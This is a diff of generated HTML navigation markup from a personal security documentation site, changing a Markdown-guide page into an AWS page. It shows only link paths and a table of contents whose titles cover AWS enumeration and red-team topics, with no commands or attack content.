@@ -6,42 +6,42 @@
       <meta charset="utf-8">
       <meta name="viewport" content="width=device-width,initial-scale=1">
       
-        <meta name="description" content="Oste's Homelab Documentation for various projects and setups.">
+        <meta name="description" content="AWS">
       
       
         <meta name="author" content="Stephen Kageche">
       
       
-        <link rel="canonical" href="https://hacktardinc.github.io/markdown/">
+        <link rel="canonical" href="https://hacktardinc.github.io/cloud/aws/">
       
       
-        <link rel="prev" href="./..">
+        <link rel="prev" href="../introduction/">
       
       
-        <link rel="next" href="../docker/">
+        <link rel="next" href="../azure/">
       
       
         
       
       
-      <link rel="icon" href="../images/favicon.ico">
+      <link rel="icon" href="../../images/favicon.ico">
       <meta name="generator" content="zensical-0.0.28">
     
     
       
-        <title>Markdown in 5min - Oste's Homelab</title>
+        <title>AWS - Oste's Homelab</title>
       
     
     
       
         
       
-      <link rel="stylesheet" href="../assets/stylesheets/modern/main.6f2fbb28.min.css">
+      <link rel="stylesheet" href="../../assets/stylesheets/modern/main.6f2fbb28.min.css">
       
         
           
         
-        <link rel="stylesheet" href="../assets/stylesheets/modern/palette.dfe2e883.min.css">
+        <link rel="stylesheet" href="../../assets/stylesheets/modern/palette.dfe2e883.min.css">
       
       
 
@@ -60,7 +60,7 @@
       
     
     
-    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce(((e,t)=>(e<<5)-e+t.charCodeAt(0)),0),__md_get=(e,t=localStorage,a=__md_scope)=>JSON.parse(t.getItem(a.pathname+"."+e)),__md_set=(e,t,a=localStorage,_=__md_scope)=>{try{a.setItem(_.pathname+"."+e,JSON.stringify(t))}catch(e){}},document.documentElement.setAttribute("data-platform",navigator.platform)</script>
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,t)=>(e<<5)-e+t.charCodeAt(0)),0),__md_get=(e,t=localStorage,a=__md_scope)=>JSON.parse(t.getItem(a.pathname+"."+e)),__md_set=(e,t,a=localStorage,_=__md_scope)=>{try{a.setItem(_.pathname+"."+e,JSON.stringify(t))}catch(e){}},document.documentElement.setAttribute("data-platform",navigator.platform)</script>
     
       
   
@@ -95,7 +95,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#markdown-in-5min" class="md-skip">
+        <a href="#cli-configuration-identity" class="md-skip">
           Skip to content
         </a>
       
@@ -111,7 +111,7 @@
 
 <header class="md-header md-header--shadow" data-md-component="header">
   <nav class="md-header__inner md-grid" aria-label="Header">
-    <a href="./.." title="Oste&#x27;s Homelab" class="md-header__button md-logo" aria-label="Oste's Homelab" data-md-component="logo">
+    <a href="../.." title="Oste&#x27;s Homelab" class="md-header__button md-logo" aria-label="Oste's Homelab" data-md-component="logo">
       
   
   <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-brick-wall-shield" viewBox="0 0 24 24"><path d="M12 9v1.258M16 3v5.46M21 9.118V5a2 2 0 0 0-2-2H5a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h5.75"/><path d="M22 17.5c0 2.499-1.75 3.749-3.83 4.474a.5.5 0 0 1-.335-.005c-2.085-.72-3.835-1.97-3.835-4.47V14a.5.5 0 0 1 .5-.499c1 0 2.25-.6 3.12-1.36a.6.6 0 0 1 .76-.001c.875.765 2.12 1.36 3.12 1.36a.5.5 0 0 1 .5.5zM3 15h7M3 9h12.142M8 15v6M8 3v6"/></svg>
@@ -131,7 +131,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Markdown in 5min
+              AWS
             
           </span>
         </div>
@@ -230,7 +230,7 @@
 
 <nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
   <label class="md-nav__title" for="__drawer">
-    <a href="./.." title="Oste&#x27;s Homelab" class="md-nav__button md-logo" aria-label="Oste's Homelab" data-md-component="logo">
+    <a href="../.." title="Oste&#x27;s Homelab" class="md-nav__button md-logo" aria-label="Oste's Homelab" data-md-component="logo">
       
   
   <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-brick-wall-shield" viewBox="0 0 24 24"><path d="M12 9v1.258M16 3v5.46M21 9.118V5a2 2 0 0 0-2-2H5a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h5.75"/><path d="M22 17.5c0 2.499-1.75 3.749-3.83 4.474a.5.5 0 0 1-.335-.005c-2.085-.72-3.835-1.97-3.835-4.47V14a.5.5 0 0 1 .5-.499c1 0 2.25-.6 3.12-1.36a.6.6 0 0 1 .76-.001c.875.765 2.12 1.36 3.12 1.36a.5.5 0 0 1 .5.5zM3 15h7M3 9h12.142M8 15v6M8 3v6"/></svg>
@@ -260,7 +260,7 @@
   
   
     <li class="md-nav__item">
-      <a href="./.." class="md-nav__link">
+      <a href="../.." class="md-nav__link">
         
   
   
@@ -286,39 +286,10 @@
       
   
   
-    
   
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
-      
-      
-        
-      
-      
-        <label class="md-nav__link md-nav__link--active" for="__toc">
-          
-  
-  
-    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M22.27 19.385H1.73A1.73 1.73 0 0 1 0 17.655V6.345a1.73 1.73 0 0 1 1.73-1.73h20.54A1.73 1.73 0 0 1 24 6.345v11.308a1.73 1.73 0 0 1-1.73 1.731zM5.769 15.923v-4.5l2.308 2.885 2.307-2.885v4.5h2.308V8.078h-2.308l-2.307 2.885-2.308-2.885H3.46v7.847zM21.232 12h-2.309V8.077h-2.307V12h-2.308l3.461 4.039z"/></svg>
-  
-  <span class="md-ellipsis">
-    
-  
-    About
-  
-
-    
-  </span>
-  
-  
-
-          <span class="md-nav__icon md-icon"></span>
-        </label>
-      
-      <a href="././" class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href="../../markdown/" class="md-nav__link">
         
   
   
@@ -336,148 +307,6 @@
   
 
       </a>
-      
-        
-
-
-<nav class="md-nav md-nav--secondary" aria-label="On this page">
-  
-  
-  
-    
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      On this page
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#headers" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Headers
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#text-formatting" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Text formatting
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#links-and-images" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Links and images
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#lists" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Lists
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#blockquotes" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Blockquotes
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#code-blocks" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Code blocks
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#tables" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Tables
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#horizontal-rule" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Horizontal rule
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#task-lists" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Task lists
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#escaping-characters" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Escaping characters
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#line-breaks" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Line breaks
-      
-    </span>
-  </a>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-      
     </li>
   
 
@@ -509,7 +338,7 @@
         
           
           <div class="md-nav__link md-nav__container">
-            <a href="../docker/" class="md-nav__link ">
+            <a href="../../docker/" class="md-nav__link ">
               
   
   
@@ -555,7 +384,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../docker/cheatsheet/" class="md-nav__link">
+      <a href="../../docker/cheatsheet/" class="md-nav__link">
         
   
   
@@ -612,7 +441,7 @@
         
           
           <div class="md-nav__link md-nav__container">
-            <a href="../research/" class="md-nav__link ">
+            <a href="../../research/" class="md-nav__link ">
               
   
   
@@ -658,7 +487,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../research/CVE-2025-68613/" class="md-nav__link">
+      <a href="../../research/CVE-2025-68613/" class="md-nav__link">
         
   
   
@@ -721,7 +550,7 @@
         
           
           <div class="md-nav__link md-nav__container">
-            <a href="../howto/" class="md-nav__link ">
+            <a href="../../howto/" class="md-nav__link ">
               
   
   
@@ -767,7 +596,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../howto/dns-records-guide/" class="md-nav__link">
+      <a href="../../howto/dns-records-guide/" class="md-nav__link">
         
   
   
@@ -797,7 +626,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../howto/pentesting-dns/" class="md-nav__link">
+      <a href="../../howto/pentesting-dns/" class="md-nav__link">
         
   
   
@@ -827,7 +656,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../howto/file-transfer-cheatsheet/" class="md-nav__link">
+      <a href="../../howto/file-transfer-cheatsheet/" class="md-nav__link">
         
   
   
@@ -857,7 +686,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../howto/pentesting-tunneling/" class="md-nav__link">
+      <a href="../../howto/pentesting-tunneling/" class="md-nav__link">
         
   
   
@@ -916,7 +745,7 @@
         
           
           <div class="md-nav__link md-nav__container">
-            <a href="../osint/" class="md-nav__link ">
+            <a href="../../osint/" class="md-nav__link ">
               
   
   
@@ -962,7 +791,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../osint/google-dorking-cheatsheet/" class="md-nav__link">
+      <a href="../../osint/google-dorking-cheatsheet/" class="md-nav__link">
         
   
   
@@ -992,7 +821,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../osint/shodan-queries-cheatsheet/" class="md-nav__link">
+      <a href="../../osint/shodan-queries-cheatsheet/" class="md-nav__link">
         
   
   
@@ -1026,6 +855,8 @@
       
   
   
+    
+  
   
   
     
@@ -1049,15 +880,15 @@
     
     
     
-    <li class="md-nav__item md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" >
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" checked>
         
           
           <div class="md-nav__link md-nav__container">
-            <a href="../cloud/" class="md-nav__link ">
+            <a href="../" class="md-nav__link ">
               
   
   
@@ -1083,7 +914,7 @@
             
           </div>
         
-        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="true">
           <label class="md-nav__title" for="__nav_7">
             <span class="md-nav__icon md-icon"></span>
             
@@ -1103,7 +934,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../cloud/introduction/" class="md-nav__link">
+      <a href="../introduction/" class="md-nav__link">
         
   
   
@@ -1130,10 +961,37 @@
                 
   
   
+    
   
   
-    <li class="md-nav__item">
-      <a href="../cloud/aws/" class="md-nav__link">
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M7.64 10.38c0 .25.02.45.07.62.05.12.12.28.21.46.04.04.05.1.05.15 0 .07-.04.13-.13.2l-.42.28c-.06.04-.12.06-.17.06-.07 0-.13-.04-.2-.1-.09-.1-.17-.2-.24-.31-.06-.11-.13-.24-.2-.39-.52.61-1.17.92-1.96.92-.56 0-1-.16-1.33-.48-.32-.32-.49-.75-.49-1.29 0-.55.2-1 .6-1.36.41-.34.95-.52 1.63-.52.23 0 .44.02.71.06.23.03.5.08.76.14v-.48c0-.51-.1-.84-.31-1.07-.22-.21-.57-.3-1.08-.3-.24 0-.48.03-.72.08-.25.06-.49.13-.72.23-.11.04-.2.07-.23.08-.05.02-.08.02-.11.02-.09 0-.14-.06-.14-.2v-.33c0-.1.01-.18.05-.23q.045-.075.18-.12c.24-.14.51-.24.84-.32a4 4 0 0 1 1.04-.13q1.185 0 1.74.54c.37.36.55.91.55 1.64v2.15zm-2.7 1.02c.22 0 .44-.04.68-.12s.45-.23.63-.43c.11-.13.19-.27.25-.43 0-.16.05-.35.05-.58v-.27c-.2-.07-.4-.07-.62-.12a7 7 0 0 0-.62-.04c-.45 0-.77.09-.99.27s-.32.43-.32.76c0 .32.07.56.24.71.16.17.39.25.7.25m5.34.71a.6.6 0 0 1-.28-.06c-.03-.05-.08-.14-.12-.26L8.32 6.65c-.04-.15-.06-.22-.06-.27 0-.11.05-.17.16-.17h.65c.13 0 .22.02.26.07.06.04.1.13.14.26l1.11 4.4 1.04-4.4c.03-.13.07-.22.13-.26.05-.04.14-.07.25-.07h.55c.12 0 .21.02.26.07.05.04.1.13.13.26L14 11l1.14-4.46c.04-.13.09-.22.13-.26.06-.04.14-.07.26-.07h.62c.11 0 .17.06.17.17 0 .03-.01.07-.02.12 0 0-.02.08-.04.15l-1.61 5.14c-.04.14-.08.21-.15.26-.04.04-.13.07-.24.07h-.57c-.13 0-.19-.02-.27-.07a.45.45 0 0 1-.12-.26L12.27 7.5l-1.03 4.28q-.045.195-.12.27a.5.5 0 0 1-.27.06zm8.55.18c-.33 0-.7-.04-1.03-.12s-.59-.17-.76-.26a.5.5 0 0 1-.21-.19.4.4 0 0 1-.04-.18v-.34c0-.14.05-.2.15-.2h.12c.04 0 .1.05.17.08.22.1.47.18.73.23.27.05.54.08.79.08.42 0 .75-.07.97-.22.23-.17.35-.36.35-.63 0-.19-.07-.34-.18-.47-.12-.12-.35-.24-.67-.34l-.97-.3c-.48-.16-.84-.38-1.06-.68a1.58 1.58 0 0 1-.33-.97c0-.28.06-.52.18-.73.12-.22.28-.4.46-.55.22-.15.44-.26.71-.34q.39-.12.84-.12.21 0 .45.03c.14.02.28.05.42.07.14.04.26.07.38.11s.2.08.28.12c.09.05.16.1.2.16s.06.13.06.22v.32q0 .21-.15.21c-.05 0-.14-.03-.26-.08-.37-.17-.8-.26-1.27-.26-.38 0-.66.06-.89.19-.2.12-.31.32-.31.59 0 .19.07.35.2.47.13.13.38.25.73.37l.95.3c.48.14.82.36 1.03.64q.3.405.3.93c0 .28-.06.54-.17.77-.12.22-.28.42-.5.58-.19.17-.44.29-.72.38s-.62.13-.95.13m1.25 3.24C17.89 17.14 14.71 18 12 18c-3.85 0-7.3-1.42-9.91-3.77-.21-.19-.02-.44.23-.29 2.82 1.63 6.29 2.62 9.89 2.62 2.43 0 5.1-.5 7.55-1.56.37-.15.68.26.32.53M21 14.5c-.29-.37-1.86-.18-2.57-.1-.21.03-.24-.16-.05-.3 1.25-.87 3.31-.6 3.54-.33.24.3-.06 2.36-1.23 3.34-.19.15-.36.07-.28-.11.27-.68.86-2.16.59-2.5"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    AWS
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="././" class="md-nav__link md-nav__link--active">
         
   
   
@@ -1151,6 +1009,447 @@
   
 
       </a>
+      
+        
+
+
+<nav class="md-nav md-nav--secondary" aria-label="On this page">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      On this page
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#cli-configuration-identity" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        CLI Configuration &amp; Identity
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="CLI Configuration &amp; Identity">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#basic-aws-cli-setup" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Basic AWS CLI Setup
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#identity-verification" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Identity Verification
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#credential-types" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Credential Types
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#aws-credentials-storage" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        AWS Credentials Storage
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="AWS Credentials Storage">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#credential-locations" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Credential Locations
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#file-structure" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        File Structure
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#core-services-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Core Services Enumeration
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Core Services Enumeration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#iam-user-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        IAM User Enumeration
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#iam-group-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        IAM Group Enumeration
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#iam-role-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        IAM Role Enumeration
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#policy-analysis" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Policy Analysis
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#red-team-operations" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Red Team Operations
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Red Team Operations">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#initial-compromise-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Initial Compromise &amp; Enumeration
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#instance-metadata-exploitation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Instance Metadata Exploitation
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#credential-configuration-validation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Credential Configuration &amp; Validation
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#privilege-escalation-techniques" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Privilege Escalation Techniques
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#common-privilege-escalation-vectors" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Common Privilege Escalation Vectors
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#automated-tools" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Automated Tools
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Automated Tools">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#pacu-aws-exploitation-framework" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Pacu - AWS Exploitation Framework
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#scoutsuite-multi-cloud-security-auditing" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ScoutSuite - Multi-Cloud Security Auditing
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cloudbrute-cloud-storage-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        CloudBrute - Cloud Storage Enumeration
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#s3scanner-s3-bucket-discovery" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        S3Scanner - S3 Bucket Discovery
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#additional-enumeration-commands" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Additional Enumeration Commands
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Additional Enumeration Commands">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#s3-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        S3 Enumeration
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ec2-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        EC2 Enumeration
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#lambda-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Lambda Enumeration
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#defense-evasion-persistence" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Defense Evasion &amp; Persistence
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Defense Evasion &amp; Persistence">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#logging-avoidance" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Logging Avoidance
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#backdoor-users" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Backdoor Users
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#useful-tools-resources" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Useful Tools &amp; Resources
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Useful Tools &amp; Resources">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#command-line-tools" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Command Line Tools
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#security-scanners" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Security Scanners
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#learning-resources" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Learning Resources
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
     </li>
   
 
@@ -1163,7 +1462,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../cloud/azure/" class="md-nav__link">
+      <a href="../azure/" class="md-nav__link">
         
   
   
@@ -1193,7 +1492,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../cloud/gcp/" class="md-nav__link">
+      <a href="../gcp/" class="md-nav__link">
         
   
   
@@ -1223,7 +1522,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../cloud/tools/" class="md-nav__link">
+      <a href="../tools/" class="md-nav__link">
         
   
   
@@ -1282,7 +1581,7 @@
         
           
           <div class="md-nav__link md-nav__container">
-            <a href="../pentesting-containers/" class="md-nav__link ">
+            <a href="../../pentesting-containers/" class="md-nav__link ">
               
   
   
@@ -1328,7 +1627,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../pentesting-containers/docker-pentesting-cheatsheet/" class="md-nav__link">
+      <a href="../../pentesting-containers/docker-pentesting-cheatsheet/" class="md-nav__link">
         
   
   
@@ -1358,7 +1657,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../pentesting-containers/kubernetes-pentesting-cheatsheet/" class="md-nav__link">
+      <a href="../../pentesting-containers/kubernetes-pentesting-cheatsheet/" class="md-nav__link">
         
   
   
@@ -1423,7 +1722,7 @@
         
           
           <div class="md-nav__link md-nav__container">
-            <a href="../pentesting-databases/" class="md-nav__link ">
+            <a href="../../pentesting-databases/" class="md-nav__link ">
               
   
   
@@ -1469,7 +1768,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../pentesting-databases/mongodb-pentesting-cheatsheet/" class="md-nav__link">
+      <a href="../../pentesting-databases/mongodb-pentesting-cheatsheet/" class="md-nav__link">
         
   
   
@@ -1499,7 +1798,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../pentesting-databases/mysql-mariadb-pentesting-cheatsheet/" class="md-nav__link">
+      <a href="../../pentesting-databases/mysql-mariadb-pentesting-cheatsheet/" class="md-nav__link">
         
   
   
@@ -1529,7 +1828,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../pentesting-databases/postgres-pentesting-cheatsheet/" class="md-nav__link">
+      <a href="../../pentesting-databases/postgres-pentesting-cheatsheet/" class="md-nav__link">
         
   
   
@@ -1559,7 +1858,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../pentesting-databases/redis-pentesting-cheatsheet/" class="md-nav__link">
+      <a href="../../pentesting-databases/redis-pentesting-cheatsheet/" class="md-nav__link">
         
   
   
@@ -1589,7 +1888,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../pentesting-databases/couchdb-pentesting-cheatsheet/" class="md-nav__link">
+      <a href="../../pentesting-databases/couchdb-pentesting-cheatsheet/" class="md-nav__link">
         
   
   
@@ -1658,7 +1957,7 @@
         
           
           <div class="md-nav__link md-nav__container">
-            <a href="../socops/" class="md-nav__link ">
+            <a href="../../socops/" class="md-nav__link ">
               
   
   
@@ -1702,7 +2001,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../socops/arkime/" class="md-nav__link">
+      <a href="../../socops/arkime/" class="md-nav__link">
         
   
   
@@ -1732,7 +2031,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../socops/velociraptor/" class="md-nav__link">
+      <a href="../../socops/velociraptor/" class="md-nav__link">
         
   
   
@@ -1762,7 +2061,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../socops/flarevm/" class="md-nav__link">
+      <a href="../../socops/flarevm/" class="md-nav__link">
         
   
   
@@ -1794,7 +2093,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../socops/thehive/" class="md-nav__link">
+      <a href="../../socops/thehive/" class="md-nav__link">
         
   
   
@@ -1824,7 +2123,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../socops/cortex/" class="md-nav__link">
+      <a href="../../socops/cortex/" class="md-nav__link">
         
   
   
@@ -1854,7 +2153,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../socops/misp/" class="md-nav__link">
+      <a href="../../socops/misp/" class="md-nav__link">
         
   
   
@@ -1884,7 +2183,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../socops/shuffle/" class="md-nav__link">
+      <a href="../../socops/shuffle/" class="md-nav__link">
         
   
   
@@ -1945,7 +2244,7 @@
         
           
           <div class="md-nav__link md-nav__container">
-            <a href="../wazuh/" class="md-nav__link ">
+            <a href="../../wazuh/" class="md-nav__link ">
               
   
   
@@ -1991,7 +2290,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../wazuh/assistant/" class="md-nav__link">
+      <a href="../../wazuh/assistant/" class="md-nav__link">
         
   
   
@@ -2021,7 +2320,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../wazuh/stepbystep/" class="md-nav__link">
+      <a href="../../wazuh/stepbystep/" class="md-nav__link">
         
   
   
@@ -2051,7 +2350,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../wazuh/vm/" class="md-nav__link">
+      <a href="../../wazuh/vm/" class="md-nav__link">
         
   
   
@@ -2110,7 +2409,7 @@
         
           
           <div class="md-nav__link md-nav__container">
-            <a href="../windows/" class="md-nav__link ">
+            <a href="../../windows/" class="md-nav__link ">
               
   
   
@@ -2156,7 +2455,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../windows/defender/" class="md-nav__link">
+      <a href="../../windows/defender/" class="md-nav__link">
         
   
   
@@ -2186,7 +2485,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../windows/update/" class="md-nav__link">
+      <a href="../../windows/update/" class="md-nav__link">
         
   
   
@@ -2234,8 +2533,6 @@
   
   
   
-    
-  
   
     <label class="md-nav__title" for="__toc">
       <span class="md-nav__icon md-icon"></span>
@@ -2244,123 +2541,424 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
